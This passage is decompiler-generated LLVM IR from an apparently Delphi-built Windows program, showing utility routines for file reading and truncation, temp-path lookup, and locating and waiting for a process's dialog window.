dec_label_pc_4069b2:                              ; preds = %dec_label_pc_406996
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1589
  %14 = call i32 @function_403720(), !insn.addr !1590
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1591
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1591
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1592
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1592
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1593
  %19 = call i32 @function_4046d4(), !insn.addr !1594
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406acb

dec_label_pc_406acb:                              ; preds = %dec_label_pc_4069b2, %dec_label_pc_406996, %dec_label_pc_40692c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1595
  %21 = load i32, i32* %20, align 4, !insn.addr !1595
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1596
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1597
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1597
  store i32 4221677, i32* %23, align 4, !insn.addr !1597
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1598
  ret i32 %24, !insn.addr !1599
}

define i32 @function_406ae6() local_unnamed_addr {
dec_label_pc_406ae6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1600
  ret i32 %0, !insn.addr !1600
}

define i32 @function_406aeb() local_unnamed_addr {
dec_label_pc_406aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1601
}

define i32 @function_406aed(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1602
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1602
  %3 = load i32, i32* %2, align 4, !insn.addr !1602
  ret i32 %3, !insn.addr !1603
}

define i32 @function_406b24() local_unnamed_addr {
dec_label_pc_406b24:
  %esp.2.reg2mem = alloca i32, !insn.addr !1604
  %esp.1.reg2mem = alloca i32, !insn.addr !1604
  %esi.0.reg2mem = alloca i32, !insn.addr !1604
  %esp.0.reg2mem = alloca i32, !insn.addr !1604
  %ebx.0.reg2mem = alloca i32, !insn.addr !1604
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1605
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1606
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1606
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1606
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1607
  %2 = call i32 @function_403c88(), !insn.addr !1608
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1609
  br i1 %3, label %dec_label_pc_406c0d, label %dec_label_pc_406b52, !insn.addr !1609

dec_label_pc_406b52:                              ; preds = %dec_label_pc_406b24
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1610
  %5 = call i32 @function_4036c8(), !insn.addr !1611
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1612
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1612
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1612
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1613
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1614
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1615
  br i1 %9, label %dec_label_pc_406c0d, label %dec_label_pc_406b8e, !insn.addr !1615

dec_label_pc_406b8e:                              ; preds = %dec_label_pc_406b52
  %10 = call i32 @"@LStrClr"(), !insn.addr !1616
  %11 = call i32 @function_403c90(), !insn.addr !1617
  %12 = icmp slt i32 %11, 0, !insn.addr !1618
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1619
  br i1 %12, label %dec_label_pc_406bd8, label %dec_label_pc_406ba6, !insn.addr !1619

dec_label_pc_406ba6:                              ; preds = %dec_label_pc_406b8e
  %13 = add i32 %11, 1, !insn.addr !1620
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1621
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1621
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1621
  br label %dec_label_pc_406ba9, !insn.addr !1621

dec_label_pc_406ba9:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406ba6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1622
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1622
  store i32 0, i32* %15, align 4, !insn.addr !1622
  %16 = load i32, i32* @global_var_40a6dc, align 4, !insn.addr !1623
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1624
  %18 = add i32 %16, %17, !insn.addr !1624
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1624
  %20 = load i32, i32* %19, align 4, !insn.addr !1624
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1624
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1624
  store i32 %20, i32* %22, align 4, !insn.addr !1624
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1625
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1625
  store i32 ptrtoint (i32* @global_var_406c54 to i32), i32* %24, align 4, !insn.addr !1625
  %25 = load i32, i32* @global_var_40a6dc, align 4, !insn.addr !1626
  %26 = or i32 %17, 4, !insn.addr !1627
  %27 = add i32 %25, %26, !insn.addr !1627
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1627
  %29 = load i32, i32* %28, align 4, !insn.addr !1627
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1627
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1627
  store i32 %29, i32* %31, align 4, !insn.addr !1627
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1628
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1628
  store i32 ptrtoint ([3 x i8]* @global_var_406c60 to i32), i32* %33, align 4, !insn.addr !1628
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1629
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1630
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1631
  %37 = icmp eq i32 %36, 0, !insn.addr !1631
  %38 = icmp eq i1 %37, false, !insn.addr !1632
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1632
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1632
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1632
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1632
  br i1 %38, label %dec_label_pc_406ba9, label %dec_label_pc_406bd8, !insn.addr !1632

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406b8e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1613
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1633
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1634
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1634
  store i32 0, i32* %42, align 4, !insn.addr !1634
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1635
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1635
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1635
  store i32 %45, i32* %44, align 4, !insn.addr !1635
  %46 = call i32 @function_4034c8(), !insn.addr !1636
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1637
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1637
  store i32 %46, i32* %48, align 4, !insn.addr !1637
  %49 = call i32 @function_403720(), !insn.addr !1638
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1639
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1639
  store i32 %49, i32* %51, align 4, !insn.addr !1639
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1640
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1640
  store i32 %39, i32* %53, align 4, !insn.addr !1640
  %54 = call i32 @function_40446c(), !insn.addr !1641
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1642
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1642
  store i32 %39, i32* %56, align 4, !insn.addr !1642
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1643
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1644
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1644
  store i32 %39, i32* %59, align 4, !insn.addr !1644
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1645
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1646
  br label %dec_label_pc_406c0d, !insn.addr !1646

dec_label_pc_406c0d:                              ; preds = %dec_label_pc_406bd8, %dec_label_pc_406b52, %dec_label_pc_406b24
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1647
  %62 = load i32, i32* %61, align 4, !insn.addr !1647
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1648
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1649
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1649
  store i32 4221999, i32* %64, align 4, !insn.addr !1649
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1650
  ret i32 %65, !insn.addr !1651
}

define i32 @function_406c28() local_unnamed_addr {
dec_label_pc_406c28:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1652
  ret i32 %0, !insn.addr !1652
}

define i32 @function_406c2d() local_unnamed_addr {
dec_label_pc_406c2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1653
}

define i32 @function_406c2f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406c2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1654
}

define i32 @function_406c64() local_unnamed_addr {
dec_label_pc_406c64:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1655
  %1 = call i32 @function_4036b8(), !insn.addr !1656
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1657
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1657
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1657
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1658
  %4 = call i32 @function_403c90(), !insn.addr !1659
  %5 = icmp slt i32 %4, 0, !insn.addr !1660
  br i1 %5, label %dec_label_pc_406cec, label %dec_label_pc_406cba, !insn.addr !1661

dec_label_pc_406cba:                              ; preds = %dec_label_pc_406c64
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1662
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1663
  br label %dec_label_pc_406d38

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406c64
  %8 = call i32 @function_403c88(), !insn.addr !1664
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1665
  %10 = call i32 @function_403c90(), !insn.addr !1666
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1667
  %12 = call i32 @function_403c90(), !insn.addr !1668
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1669
  %14 = call i32 @function_406b24(), !insn.addr !1670
  br label %dec_label_pc_406d38, !insn.addr !1670

dec_label_pc_406d38:                              ; preds = %dec_label_pc_406cba, %dec_label_pc_406cec
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1671
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1672
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1673
  ret i32 %16, !insn.addr !1674
}

define i32 @function_406d53() local_unnamed_addr {
dec_label_pc_406d53:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1675
  ret i32 %0, !insn.addr !1675
}

define i32 @function_406d58() local_unnamed_addr {
dec_label_pc_406d58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1676
}

define i32 @function_406d5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1677
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1677
  %3 = load i32, i32* %2, align 4, !insn.addr !1677
  ret i32 %3, !insn.addr !1678
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1679
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1679
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1679
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1680
  %2 = load i32, i32* @global_var_40a6d8, align 4, !insn.addr !1681
  %3 = add i32 %2, 1, !insn.addr !1681
  %4 = icmp eq i32 %3, 0, !insn.addr !1681
  store i32 %3, i32* @global_var_40a6d8, align 4, !insn.addr !1681
  %5 = icmp eq i1 %4, false, !insn.addr !1682
  br i1 %5, label %dec_label_pc_406d9c, label %dec_label_pc_406d7d, !insn.addr !1682

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d64
  %6 = load i32, i32* @global_var_40912c, align 4, !insn.addr !1683
  %7 = icmp eq i32 %6, 0, !insn.addr !1683
  br i1 %7, label %dec_label_pc_406d8c, label %dec_label_pc_406d87, !insn.addr !1684

dec_label_pc_406d87:                              ; preds = %dec_label_pc_406d7d
  %8 = call i32 @function_406b24(), !insn.addr !1685
  br label %dec_label_pc_406d8c, !insn.addr !1685

dec_label_pc_406d8c:                              ; preds = %dec_label_pc_406d87, %dec_label_pc_406d7d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1686
  br label %dec_label_pc_406d9c, !insn.addr !1686

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d8c, %dec_label_pc_406d64
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1687
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1688
  ret i32 0, !insn.addr !1689
}

define i32 @function_406daa() local_unnamed_addr {
dec_label_pc_406daa:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1690
  ret i32 %0, !insn.addr !1690
}

define i32 @function_406daf() local_unnamed_addr {
dec_label_pc_406daf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1691
}

define i32 @function_406db1(i32 %arg1) local_unnamed_addr {
dec_label_pc_406db1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1692
}

define i32 @function_406db4() local_unnamed_addr {
dec_label_pc_406db4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1693
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1693
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1693
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1694
  %2 = load i32, i32* @global_var_40a6d8, align 4, !insn.addr !1695
  %3 = add i32 %2, -1, !insn.addr !1695
  %4 = icmp eq i32 %2, 0, !insn.addr !1695
  store i32 %3, i32* @global_var_40a6d8, align 4, !insn.addr !1695
  %5 = icmp eq i1 %4, false, !insn.addr !1696
  br i1 %5, label %dec_label_pc_406de8, label %dec_label_pc_406dce, !insn.addr !1696

dec_label_pc_406dce:                              ; preds = %dec_label_pc_406db4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1697
  br label %dec_label_pc_406de8, !insn.addr !1698

dec_label_pc_406de8:                              ; preds = %dec_label_pc_406dce, %dec_label_pc_406db4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1699
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1700
  ret i32 0, !insn.addr !1701
}

define i32 @function_406df6() local_unnamed_addr {
dec_label_pc_406df6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1702
  ret i32 %0, !insn.addr !1702
}

define i32 @function_406dfb() local_unnamed_addr {
dec_label_pc_406dfb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1703
}

define i32 @function_406dfd(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dfd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1704
}

define i1 @function_406e00(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406e00:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1705
  ret i1 %0, !insn.addr !1705
}

define i32 @function_406e08() local_unnamed_addr {
dec_label_pc_406e08:
  %eax.0.reg2mem = alloca i32, !insn.addr !1706
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1707
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1708
  %2 = icmp eq i32 %1, 0, !insn.addr !1709
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1710
  br i1 %2, label %dec_label_pc_406e3e, label %dec_label_pc_406e20, !insn.addr !1710

dec_label_pc_406e20:                              ; preds = %dec_label_pc_406e08
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1707
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1711
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1711
  %7 = load i8, i8* %6, align 1, !insn.addr !1711
  %8 = icmp eq i8 %7, 92, !insn.addr !1711
  br i1 %8, label %dec_label_pc_406e30, label %dec_label_pc_406e27, !insn.addr !1712

dec_label_pc_406e27:                              ; preds = %dec_label_pc_406e20
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1713
  store i8 92, i8* %9, align 1, !insn.addr !1713
  %10 = or i32 %3, 1, !insn.addr !1714
  %11 = add i32 %1, %10, !insn.addr !1714
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1714
  store i8 0, i8* %12, align 1, !insn.addr !1714
  br label %dec_label_pc_406e30, !insn.addr !1714

dec_label_pc_406e30:                              ; preds = %dec_label_pc_406e27, %dec_label_pc_406e20
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1715
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1715
  br label %dec_label_pc_406e3e, !insn.addr !1715

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e30, %dec_label_pc_406e08
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1716
}

define i32 @function_406e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e48:
  %esp.0.reg2mem = alloca i32, !insn.addr !1717
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1718
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1719
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1719
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1719
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1720
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1721
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1721
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1722
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1722
  %5 = icmp eq i1 %4, false, !insn.addr !1723
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1724
  br i1 %5, label %dec_label_pc_406eff, label %dec_label_pc_406e7f, !insn.addr !1724

dec_label_pc_406e7f:                              ; preds = %dec_label_pc_406e48
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1725
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1725
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1726
  %8 = icmp eq i32 %7, 32770, !insn.addr !1727
  %9 = icmp eq i1 %8, false, !insn.addr !1728
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1728
  br i1 %9, label %dec_label_pc_406eff, label %dec_label_pc_406e8e, !insn.addr !1728

dec_label_pc_406e8e:                              ; preds = %dec_label_pc_406e7f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1729
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1729
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1730
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1730
  %13 = add i32 %arg1, 4, !insn.addr !1731
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1731
  %15 = load i32, i32* %14, align 4, !insn.addr !1731
  %16 = icmp eq i32 %15, %12, !insn.addr !1731
  %17 = icmp eq i1 %16, false, !insn.addr !1732
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1732
  br i1 %17, label %dec_label_pc_406eff, label %dec_label_pc_406e99, !insn.addr !1732

dec_label_pc_406e99:                              ; preds = %dec_label_pc_406e8e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1733
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1733
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1734
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1735
  %21 = load i32, i32* %20, align 4, !insn.addr !1735
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1736
  %23 = icmp eq i32 %21, %22, !insn.addr !1736
  %24 = icmp eq i1 %23, false, !insn.addr !1737
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1737
  br i1 %24, label %dec_label_pc_406eff, label %dec_label_pc_406eaa, !insn.addr !1737

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e99
  %25 = add i32 %arg1, 8, !insn.addr !1738
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1738
  %27 = load i32, i32* %26, align 4, !insn.addr !1738
  %28 = icmp eq i32 %27, 0, !insn.addr !1738
  br i1 %28, label %dec_label_pc_406ed4, label %dec_label_pc_406eb0, !insn.addr !1739

dec_label_pc_406eb0:                              ; preds = %dec_label_pc_406eaa
  %29 = call i32 @function_407020(), !insn.addr !1740
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1741
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1742
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eff

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eaa
  %32 = add i32 %arg1, 12, !insn.addr !1743
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1743
  %34 = load i32, i32* %33, align 4, !insn.addr !1743
  %35 = add i32 %arg1, 16, !insn.addr !1744
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1744
  %37 = load i32, i32* %36, align 4, !insn.addr !1744
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1745
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1745
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1745
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1745
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1745
  %43 = add i32 %arg1, 24, !insn.addr !1746
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1746
  store i32 %42, i32* %44, align 4, !insn.addr !1746
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1747
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1747
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1748
  %47 = icmp eq i1 %46, false, !insn.addr !1749
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1750
  br i1 %47, label %dec_label_pc_406eff, label %dec_label_pc_406efa, !insn.addr !1750

dec_label_pc_406efa:                              ; preds = %dec_label_pc_406ed4
  %48 = add i32 %arg1, 20, !insn.addr !1751
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1751
  store i32 %arg2, i32* %49, align 4, !insn.addr !1751
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1752
  br label %dec_label_pc_406eff, !insn.addr !1752

dec_label_pc_406eff:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406efa, %dec_label_pc_406ed4, %dec_label_pc_406e99, %dec_label_pc_406e8e, %dec_label_pc_406e7f, %dec_label_pc_406e48
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1753
  %51 = load i32, i32* %50, align 4, !insn.addr !1753
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1754
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1755
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1755
  store i32 4222753, i32* %53, align 4, !insn.addr !1755
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1756
  ret i32 %54, !insn.addr !1757
}

define i32 @function_406f1a() local_unnamed_addr {
dec_label_pc_406f1a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1758
  ret i32 %0, !insn.addr !1758
}

define i32 @function_406f1f() local_unnamed_addr {
dec_label_pc_406f1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1759
}

define i32 @function_406f21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f21:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1760
}

define i32 @function_406f2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f2c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1761
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1762
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1763
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1763
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1763
  %6 = call i32 @function_40441c(), !insn.addr !1764
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1765
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1766
  br label %dec_label_pc_406f70, !insn.addr !1766

dec_label_pc_406f70:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f2c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1765
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1765
  store i32 %7, i32* %9, align 4, !insn.addr !1765
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1767
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1767
  store i32 4222536, i32* %11, align 4, !insn.addr !1767
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1768
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1769
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1769
  store i32 1, i32* %14, align 4, !insn.addr !1769
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1770
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1771
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1771
  store i32 0, i32* %16, align 4, !insn.addr !1771
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1772
  %18 = icmp eq i1 %17, false, !insn.addr !1773
  %19 = icmp eq i1 %18, false, !insn.addr !1774
  br i1 %19, label %dec_label_pc_406f9a, label %dec_label_pc_406f8f, !insn.addr !1774

dec_label_pc_406f8f:                              ; preds = %dec_label_pc_406f70
  %20 = call i32 @function_40441c(), !insn.addr !1775
  %21 = sub i32 %20, %6, !insn.addr !1776
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1777
  %23 = icmp eq i1 %22, false, !insn.addr !1778
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1778
  br i1 %23, label %dec_label_pc_406f70, label %dec_label_pc_406f9a, !insn.addr !1778

dec_label_pc_406f9a:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f70
  ret i32 0, !insn.addr !1779
}

define i32 @function_406fb4() local_unnamed_addr {
dec_label_pc_406fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1780
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1781
}

